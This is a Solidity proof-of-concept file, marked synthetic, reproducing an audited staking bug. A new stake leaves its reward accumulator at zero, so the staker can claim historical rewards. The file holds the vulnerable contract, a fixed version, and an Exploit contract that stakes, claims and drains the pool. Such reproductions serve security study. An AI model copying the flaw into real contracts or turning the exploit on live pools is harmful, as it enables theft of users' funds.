// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DIA DIAStakingCommons — a new stake leaves rewardAccumulator at 0
    (MixBytes, Lumina Staking, 2025-06, Critical 3).
    SYNTHETIC, cheatcode-free. The delta line is verbatim.

    The global accumulator is already 1,000 from rewards accrued before this
    stake. _internalStakeForAddress does not copy it into the store, so
    stakerDelta = rewardAccumulator - 0 and a 10,000 principal is paid
    1,000 WDIA of historical rewards. lastUpdate is this block, so the
    update adds nothing. run() does not warp. */

contract StakeToken {
    string public constant name = "WDIA";
    string public constant symbol = "WDIA";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract DIAWhitelistedStaking {
    struct StakingStore {
        uint256 principal;
        uint256 rewardAccumulator;
        address principalUnstaker;
    }

    uint256 public constant SECONDS_IN_A_DAY = 1 days;
    StakeToken public STAKING_TOKEN;
    uint256 public rewardRatePerDay;
    uint256 public rewardAccumulator;
    uint256 public rewardLastUpdateTime;
    uint256 public stakingIndex;
    mapping(uint256 => StakingStore) public stakingStores;

    constructor(StakeToken token_, uint256 historicalIndex) {
        STAKING_TOKEN = token_;
        rewardRatePerDay = 100;
        rewardAccumulator = historicalIndex;
        rewardLastUpdateTime = block.timestamp;
    }

    function _updateRewardAccumulator() internal returns (bool) {
        uint256 daysElapsed = (block.timestamp - rewardLastUpdateTime) / SECONDS_IN_A_DAY;
        uint256 rewardsAccrued = rewardRatePerDay * daysElapsed;
        rewardAccumulator += rewardsAccrued;
        rewardLastUpdateTime = block.timestamp;
        return true;
    }

    /// @dev `_internalStakeForAddress` never writes `newStore.rewardAccumulator`.
    function stake(uint256 amount) external virtual returns (uint256 index) {
        STAKING_TOKEN.transferFrom(msg.sender, address(this), amount);
        stakingIndex++;
        StakingStore storage newStore = stakingStores[stakingIndex];
        newStore.principal = amount;
        newStore.principalUnstaker = msg.sender;
        return stakingIndex;
    }

    function claim(uint256 stakingStoreIndex) external returns (uint256 stakerReward) {
        StakingStore storage currentStore = stakingStores[stakingStoreIndex];
        _updateRewardAccumulator();
        uint256 stakerDelta;
        // @> VULN: stakerDelta = rewardAccumulator - currentStore.rewardAccumulator
        stakerDelta = rewardAccumulator - currentStore.rewardAccumulator;
        currentStore.rewardAccumulator = rewardAccumulator;
        stakerReward = (stakerDelta * currentStore.principal) / 10000;
        if (stakerReward > 0) STAKING_TOKEN.transfer(msg.sender, stakerReward);
    }

    function unstakePrincipal(uint256 index) external {
        StakingStore storage currentStore = stakingStores[index];
        uint256 principalToSend = currentStore.principal;
        currentStore.principal = 0;
        STAKING_TOKEN.transfer(msg.sender, principalToSend);
    }
}

contract DIAWhitelistedStakingFixed is DIAWhitelistedStaking {
    constructor(StakeToken token_, uint256 historicalIndex) DIAWhitelistedStaking(token_, historicalIndex) {}

    function stake(uint256 amount) external override returns (uint256 index) {
        STAKING_TOKEN.transferFrom(msg.sender, address(this), amount);
        stakingIndex++;
        StakingStore storage newStore = stakingStores[stakingIndex];
        newStore.principal = amount;
        newStore.principalUnstaker = msg.sender;
        newStore.rewardAccumulator = rewardAccumulator;
        return stakingIndex;
    }
}

contract Exploit {
    uint256 public constant PRINCIPAL = 10_000 ether;
    uint256 public constant HISTORICAL = 1_000;
    uint256 public constant STOLEN = 1_000 ether;

    StakeToken public token; // nonce 1
    DIAWhitelistedStaking public staking; // nonce 2

    uint256 public index;
    uint256 public claimed;
    uint256 public profit;

    constructor() {
        token = new StakeToken();
        staking = new DIAWhitelistedStaking(token, HISTORICAL);
        token.mint(address(this), PRINCIPAL);
        token.mint(address(staking), STOLEN);
    }

    function run() external {
        uint256 start = token.balanceOf(address(this));
        token.approve(address(staking), PRINCIPAL);
        index = staking.stake(PRINCIPAL);
        claimed = staking.claim(index);
        staking.unstakePrincipal(index);
        profit = token.balanceOf(address(this)) - start;
        require(staking.rewardAccumulator() == HISTORICAL, "index unchanged");
        require(claimed == STOLEN, "claimed 1000 historical");
        require(profit == STOLEN, "net 1000 stolen");
        require(token.balanceOf(address(staking)) == 0, "pool emptied");
    }
}
